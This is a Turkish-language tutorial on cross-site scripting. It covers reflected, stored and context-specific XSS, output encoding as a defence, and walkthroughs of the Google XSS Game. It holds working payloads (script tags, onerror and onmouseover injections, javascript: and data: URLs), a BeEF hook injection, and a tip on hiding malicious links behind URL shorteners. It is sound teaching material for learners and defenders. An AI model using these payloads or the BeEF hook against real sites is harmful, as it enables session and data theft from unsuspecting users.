<h1 align="center">XSS - 1</h1> 

# XSS(Cross Site Scripting)(Siteler Arası Komut Dosyası Çalıştırma)

## XSS Tespiti

Adından da anlaşılacağı üzere bir web uygulamasında komut çalıştırabildiğimiz durumlarda bu zaafiyet ortaya çıkar. Bunda örnekler üzerinden gidelim;

* Bir hackerın gözünden internetin nasıl çalıştığını hatırlayalım;

![alt text](<WebSec101 0x08_ss/image.png>)

* Web uygulaması ile kullanıcı arasında bir **request-response ilişkisi** vardı. Yani biz web uygulaması içinde bir sorgu çalıştırırız ve web uygulamasından bize bir yanıt gelir. Örneğin bir web sitesinde **arama yapıyor olmamız(request)** ve web sitesinin arama **sonuçlarını gösteriyor olması(response)** gibi.

* XSS'in açığa çıkma durumu da aslında web uygulamasının kullanıcıya verdiği response ile alakalıdır. 

* İlk alıştırmada kullandığımız alıştırma web sitesi üzerinden(http://testphp.vulnweb.com/index.php) gidelim;

![alt text](<WebSec101 0x08_ss/image-1.png>)

* Bu sitede arama yerine herhangi bir şey yazalım ve aratalım;

![alt text](<WebSec101 0x08_ss/image-2.png>)

* Aramayı yaptıktan sonra web uygulamasında bir yere sağ tıklayalım ve **sayfa kaynağını görüntüle** tuşuna basalım;

![alt text](<WebSec101 0x08_ss/image-3.png>)

* Önümüze çıkan sayfada biraz aşağı indiğimizde arama kısmına yazdığımız yazıyı görebildiğimizi farkedeceğiz;

![alt text](<WebSec101 0x08_ss/image-4.png>)

* Şimdi burada yorum yapalım. Web uygulaması bizim arama yaptığımız yazıyı response olarak bize dönüyor. Peki ya arama yerine saldırgan bir kod yazdığımızı varsayalım. Bu durumda web uygulaması bu kodu okuma ihtimali ve okuduğu kodu çalıştırıp response olarak bize gösterme ihtimali nedir? Sonuçta arama yaptığımız yazıyı bize gösterdi. Bir kodun sonuçlarını da gösterebilir değil mi? Bu yorumlar XSS tespiti için önemlidir ve XSS aslında temelde bu noktada ortaya çıkmaktadır.

* Arama yerine **<script>alert(1)</script>** yazalım ve aratalım;

![alt text](<WebSec101 0x08_ss/image-5.png>)

* Evet gördüğümüz üzere yazdığımız kod(javascript kodu) çalıştı ve üzerinde 1 yazan bir uyarı kutusu geldi. Bu basit bir **XSS payload(yükleme anlamına gelir ve yüklediğimiz şey aslında yazdığımız koddur. Bu çalışan koda yapılan bir atıftır.)**'dur. Yaptığı şey de aslında sadece üzerinde 1 yazan bir uyarı kutusu çıkarmaktır. 

* Buradan da **POC** kavramı ortaya çıkıyor. Açılmı Proof of Concept'tir. Yani konseptin kanıtı olarak düşünebiliriz. Burada web uygulamasında js(javascript) kodu çalıştırabildiğimiz için bunun **POC'si** yani **kanıtı** bu söz konusu kod olur. 


## XSS Sömürüsü

* Buraya kadar XSS'i tespit ettik. Şimdi tespit ettikten sonra nasıl sömürülür ona bakalım.

* Aslında sömürü verdiğimiz site örneğinden yola çıkarsak arama kısmını çeşitli js kodları ile doldurmaktan geçiyor. Bu sayede çok fazla şey yapılabilir. Burada da işimizi kolaylaşsın diye bir **tool(araç)**'a göz atalım;

### BEEF (XSS Exploitation Framework)

Tarayıcı için sömürü aracı olarak düşünebiliriz. Bir önceki kullandığımız burpsuit'e benzer bir tool.

![alt text](<WebSec101 0x08_ss/image-6.png>)

Yaptığı şey basitçe anlatmak gerekirse XSS tespiti sonrası **<script>alert(1)</script>** kodlarında alert yerine BEEF'in bize verdiği url'i yazmamızı istiyor.  **<script>http://127.0.0.1:3000/hook.js</script>** bu kodu yazdığımızda aslında belirli bir adrese gidiyor ve hook.js dosyasını okuyor. İşte bu dosyanın içinde de sömürü kodları var. Bu kodlar ve yapabildikleri ise BEEF tarafından bize bir arayüzde gösteriliyor. Yani yönetmesi daha kolay hale geliyor;

![alt text](<WebSec101 0x08_ss/image-8.png>)

XSS'in tespit edildiği web uygulamalarında bu kodu arattığımızda Beef tarafından yukarıdaki görselde olduğu gibi veri okumaları yapabiliyoruz. Örneğin web uygulamasının sosyal medya olduğu durumlarda kurban kişinin mesajlarına ulaşılabilir ya da e ticaret sitesinde kredi kartı bilgileri saldırgan tarafından ele geçirilebilir. Bunların hepsi XSS zaafiyeti yüzündendir ve BEEF gibi bir tool ile bu işlemler daha verimli bir şekilde gerçekleşir.


***XSS Detection(Tespit)***:

***<script>alert(1)</script>***

***XSS Exploit(Sömürü)***:

***<script>http://127.0.0.1:3000/hook.js</script>***

### Reflected XSS(Yansıyan XSS)

Şimdiye kadar gördüğümüz XSS tespiti sadece bizim tarafımızdaydı yani sadece bize gözüküyordu(**Self XSS(Kendine XSS) deniyor**).;

![alt text](<WebSec101 0x08_ss/image.png>)

Ancak Reflected XSS'te requestin kurban tarafından yapılması gerekir ve saldırganın başka bir kullanıcının request response döngüsüne olan müdahalesi ve sömürüsü söz konusudur. Başka bir kullanıcının request response döngüsünü XSS aracılığıyla sömürmek **Reflected XSS** ile ilgilidir. Örneğin bir websitemiz olsun ve adı **a.com** olsun.**www.a.com/?keyword=<script>alert(1)</script>** şeklindeki adresi bir başka kullanıcıya tıklatabilirsek eğer, o zaman onun bilgisayarında XSS kullanarak bazı yetkilere sahip oluruz(web uygulaması kapsamında). **www.a.com/?keyword=<script>alert(1)</script>** Ancak bu kod bir hayli uzun. Buna kimse tıklamaz. Bunu gizlemenin yolları da var tabii;

![alt text](<WebSec101 0x08_ss/image-9.png>)

Bu tarz web siteleri linkleri kısaltıyor;

![alt text](<WebSec101 0x08_ss/image-10.png>)

Bu sayede artık koddaki js okunmaz halde. Dolayısıyla bir başkası tıklayabilir. Tıkladıktan sonra da XSS zaafiyeti dolayısıyla tıklayan kişinin verileri kodun içeriği ölçüsünde tehlikeye girer.

### Stored XSS(Saklanmış XSS)

**Request response döngüsünü** hatırlayalım;

![alt text](<WebSec101 0x08_ss/image.png>)

Kullanıcı olarak biz web uygulamasına XSS injection yaptığımızda bize her zaman response dönmeyebilir. Örn;

![alt text](<WebSec101 0x08_ss/image-11.png>)

Saldırganın gönderdiği **payload**, response olarak dönmek yerine veritabanına oradan da web servis gibi başka yapılarda dolanabilir. Örneğin biz bir e ticaret sitesinde bunun yapıldığını düşünelim. Saldırgan web uygulamasına XSS injection yapıyor ve sorgusunu gönderiyor. Uygulamadan **response** dönmeden önce gönderilen kod veritabanına gidiyor ve orada dolanıyor. Diğer kullanıcılar da bu uygulamayı kullandığı için veritabanındaki verileri site arayüzünde görebilirler. Saldırgan kod da veritabanında olduğu için diğer kullanıcılar veritabanından sorgu yaparak çekecekleri verilerden birinde saldırganın kodu bulunabilir ve diğer kullanıcılardan bazıları XSS injection'a doğrudan maruz kalabilir. Örneğin e ticaret sitesinde biz kullanıcı yorumlarını görebiliyoruz. Ancak bu yorumlar bize veritabanından geliyor ve uygulamada bize gözükür haldeler. Şimdi saldırgan kodun uygulamada kullanıcı yorumlarından birinde olduğunu varsayarsak ve biz de bu yorumları uygulamada görüntülersek verilerimiz o yorumlara saklanan XSS kodu tarafından tehlikeye girebilir. Çünkü yorumu görüntüleyen bizim bilgisayarımız dolayısıyla yorumla beraber saldırgan kodu görüntüleyen de bizim bilgisayarımız. Kullanıcılar buna farkında olmadan maruz kalabilirler ve çoğu zaman kullanıcı tarafında iş işten geçmiş olur. Bu tarz durumlarda XSS kodu uygulama içerisinde saklanmış vaziyette olduğundan adına **Stored XSS** deniyor. 

### HTML Context

* Sözlük;
 * encode:çeşitli karakterleri başka bir formata çevirmek. Şifrelemek.

XSS zaafiyetinin html içeriğinde olması ile ilgilidir. Örneğin **www.x.com/?keyword=CAN** şöyle bir siteye girdiğimizi düşünelim ve kabaca şöyle bir kod grubu ile karşılaştığımızı varsayalım;

**www.x.com/?keyword=CAN**:

```html
<html>
 <body>
  <p>
   Aradığınız kelime CAN
  </p>
 </body>
</html>
```

Biz biliyoruz ki CAN yerine **<script>alert(1)</script>** yazabiliriz ve yazarsak da XSS tespiti yapabiliriz. Bunun sebebi aslında bu kodun html içeriğinde olması ile ilgilidir. Yani tarayıcı ''<>'' işaretlerini **veri** olarak okuyor bunlar bir sembol veya karakter değiller. Dolayısıyla yazdığımız saldırgan kod bu sayede çalışabilir. İşte bu çalışan kod **HTML Context** bağlamında çalışır.

### Attribute Context

**www.x.com/?keyword=CAN**

yine aynı sitede bu sefer içeriği biraz daha değişik;

```html
<html>
 <body>
   <form>
    <input name="keyword" value="CAN <script>alert(1)</script>">
   </form>
 </body>
</html>
```

Burada **value="CAN"** yazan yere **<script>alert(1)</script>** kodunu yapıştırdığımızda çalışmaz. Çünkü **CAN** orada bir **attribute(özellik)** konumunda yani value keyword'ünün bir özelliği. Dolayısıyla kodumuz bir **string** olarak gözükür ve çalışmaz. Ama;


**www.x.com/?keyword=<script>alert(1)</script>**: 

```html
<html>
 <body>
   <form>
    <input name="keyword" value=" "><script>alert(1)</script> ">
   </form>
 </body>
</html>
```

Şeklinde eklediğimizde daha düzgün olacaktır. Çünkü biz attribute tanımını bir tırnak işareti daha koyarak bitirdik. Ama;

```html
<html>
 <body>
   <form>
    <input name="keyword" value=" "&gt;&lt;script&gt;alert(1)&lt/script&gt">
   </form>
 </body>
</html>
```

Ancak verdiğimiz kod XSS saldırılarına karşın **encode**(veriyi belirli bir formata dönüştürmek) edilmiş olabilir. Dolayısıyla **<script>alert(1)</script>** kodumuz **&gt;&lt;script&gt;alert(1)&lt/script&gt**'a dönüşecek. Buradaki ifadeler de aslında işaretleri simgeler;

**&gt: greater than: büyüktür işareti**
**&lt: ligther than: küçüktür işareti**

Yani yazdığımız koddaki karakterler dönüştürülüyor ki bunları kullanıp **html contextdeki** gibi sömürü yapılamasın. Zaten encoding yapma sebebi de **<>** işaretlerinin olduğu kodları engellemek. ***Ancak XSS'in sömürüsünün pek çok yolu vardır***; 

**www.x.com/?keyword=onmouseover="alert(1)"**

```html
<html>
 <body>
   <form>
    <input name="keyword" value=" "onmouseover="alert(1)">
   </form>
 </body>
</html>
```


Bu şekilde **attribute** özelliğini kapattıktan sonra yeni bir **attribute** tanımlayabilir ve o **attribute**'un içine kodumuzu yazabiliriz. Bu sayede kodumuzu enjekte edebiliriz. **Buradaki önemli nokta bakış açısıdır. Saldırgan pek çok şekilde kodunu enjekte edeceği yöntemler bulabilir**. Yani çeşitli karakterleri (<> gibi) encode etmek demek %100 güvenlik demek değildir. Bu bağlam da **Attribute Context** olarak adlandırılır.



### Jsinline Context

* Sözlük
  * inline JS: Java script kodunun html elementlerine **onclick** **onmouseover** gibi event attributelar ile gömülü olduğu durumları kapsar.
 

Burada yine bir attribute var ve attribute'a  javascript kodu inject ediliyor. Buna da **jsinline contexti** deniyor. Çünkü html'e gömülü bir şekilde yazılmış bir js kodu var. 

```
www.x.com/?id=1
```

```html
<html>
 <body>
   <input type="button" onclick="saveForm(alert(1))">
 </body>
</html>
```

```
www.x.com/?id=alert(1)
```
Şeklinde XSS yapılabilir.  

### HREF Context

Kullanıcıdan alınan input **a href** kısmına verildiği durumlarda da XSS meydana gelebilir. Bağlamı ise **HREF Context** olur. 

```html
<html>
 <body>
   <a href="USER_DATA">Click Me</a>
 </body>
</html>
```

burada ise js'in browserlarda protocol handler davranışı gösterdiği durumlar dikkata alınarak **javascript:alert(1)** kodu inject edilmiştir. Bu kod sadece **a tagının(etiket) href attribute'u** içerisinde geçerli olmaktadır. Yani duruma göre saldırgan kod yazılır.

```html
<html>
 <body>
   <a href="javascript:alert(1)">Click Me</a>
 </body>
</html>
```

### XSS Nasıl Engellenir?

HTML ve data içeriğinin browser'a verildiği noktada XSS engellenebilir. Hatırlarsak kullanıcı ve web uygulaması arasında request response döngüsü bulunuyordu. Kullanıcı input gönderir ve web adresinden response olarak kullanıcıya geri döner. İşte bu geri dönme noktası yani response kast ediliyor. 

***INPUT VALIDATION, OUTPUT ENCODING***: Inputu(girdiyi) doğrula ve outputu(çıktıyı) şifrele. Bu da bizi **Context Based Encoding (İçerik tabanlı şifreleme)** başlığına getiriyor. İsminden de anlaşılacağı üzere içeriğe göre şifreleme yapan bir yöntemdir. 

Biraz önce birkaç **context**'den bahsetmiştik. İşte o contextlere göre bir şifreleme yapıyor yazılımcı;

```html
<html>
 <body>
   <a href="{{encoder.HrefContextEncoder($untrusted_data)}}">Click Me</a>
 </body>
</html>
```

Yukarıdaki örnekte href contextine göre bir şifreleme yöntemi söz konusu olmuş. Yani kullanılan koda göre bir encoding işlemi yapıyor. Aynısı versiyonunu başka Contextler için de yapabilir. Burada esas problem contextlerin çok fazla olmasıdır. Dolayısıyla XSS devamlı öğrenilen bir şey haline geliyor. 


## Google XSS Challenge

# 1

https://xss-game.appspot.com/level1

![alt text](<WebSec101 0x08_ss/image-12.png>)

Arama yerine herhangi bir şey yazalım ve aratalım;

![alt text](<WebSec101 0x08_ss/image-13.png>)

Yukarıdaki kodun sonunda **query=can** yazıyor. Yani yazdığımız yazı orada çıktı. Hemen html contexti hatırlayalım ve <script>alert(1)</script> ve arayalım;

![alt text](<WebSec101 0x08_ss/image-14.png>)

# 2

* Toggle code diyelim ve kodlara bakalım;

![alt text](<WebSec101 0x08_ss/image-15.png>)

* Dikkat edersek mesajlar kod tarafında gözüküyor. Yani oraya kod yapıştırabilirsek uygulamaya çalıştırtabiliriz;

* '"><img src=x onerror=alert(1)> kodunu yapıştırırsak hata verdiği durumda alerti çalıştıracak. Koda dikkat edersek '" ile başlıyor yani bir önceki tırnakları kapatarak yeni bir tag oluşturuyor. Sonra da bir resim dosyası oluşturup, ismine x diyor error vermesi için ve error verdiğinde alerti yapıştır diyor. Bunu mesaj kısmına yazıp gönderelim;

![alt text](<WebSec101 0x08_ss/image-16.png>)

# 3

* Resimleri değiştirdiğimiz vakit sırasıyla urlde #1 #2 #3 şeklinde değişimler meydana geliyor;

![alt text](<WebSec101 0x08_ss/image-17.png>)

* Kod kısmı da bunu doğruluyor. 

![alt text](<WebSec101 0x08_ss/image-18.png>)

* Son sayıyı silip yerine 'onmouseover='alert(1) şeklinde yazıp deneyelim ve çıkacak bozuk resim dosyasının üzerine mouse ile gelelim;

![alt text](<WebSec101 0x08_ss/image-19.png>)


# 4

![alt text](<WebSec101 0x08_ss/image-20.png>)

* Timer koduna dikkat edelim. Zamanlayıcıyı başlatırken 'timer' isimli parametre koyulmuş. Bu da değerini biz create timer diyince alıyor. Yani oraya zamana bağlı bir alert koyarsak çalışabilir. O alert de '-alert(1)-' şeklinde yazılabilir. Bunu create timer kısmına yapıştırıp aratırsak tamamlarız;

![alt text](<WebSec101 0x08_ss/image-21.png>)

# 5 

![alt text](<WebSec101 0x08_ss/image-22.png>)

* Signup tuşuna basalım ve url'e bakalım;

![alt text](<WebSec101 0x08_ss/image-23.png>)

* next=confirm dikkatimizi çekiyor. confirm yerine kod enjekte edilebilir. Çünkü next tuşuna basılacağı zaman confirm kodunu çalıştıracakmış. Bizde diyoruz ki next tuşuna basıldığı zaman javascript:alert(1) kodu çalıştırılsın ve XSS zaafiyeti ortaya çıksın;

![alt text](<WebSec101 0x08_ss/image-24.png>)

# 6

![alt text](<WebSec101 0x08_ss/image-25.png>)

* koda baktığımızda http url requestlerini engellemek için bir kod yazılmış. Ancak biz başka şekil bir url de yazabiliriz. JS'de bunun için bir yöntem var.

* **data:text/javascript,alert(1)** kodunu frame keyword'ünden sonra url'e yapıştırırsak;

![alt text](<WebSec101 0x08_ss/image-27.png>)

* Tamamlamış oluyoruz. Aslında http requestine benzer bir request ama tek farkı js ile yazılmış olması. Yani yine bir request var ve bu sefer js ile yazılmış request. Bunun dışında o adreste yine alert(1) çalıştırılıyor.

# KAYNAK

[Web Security 0x08 | XSS Güvenlik Zafiyeti Hakkında Her Şey Part - 1](https://www.youtube.com/watch?v=NFD3vZ-lIgI&list=PLwP4ObPL5GY940XhCtAykxLxLEOKCu0nT&index=8)


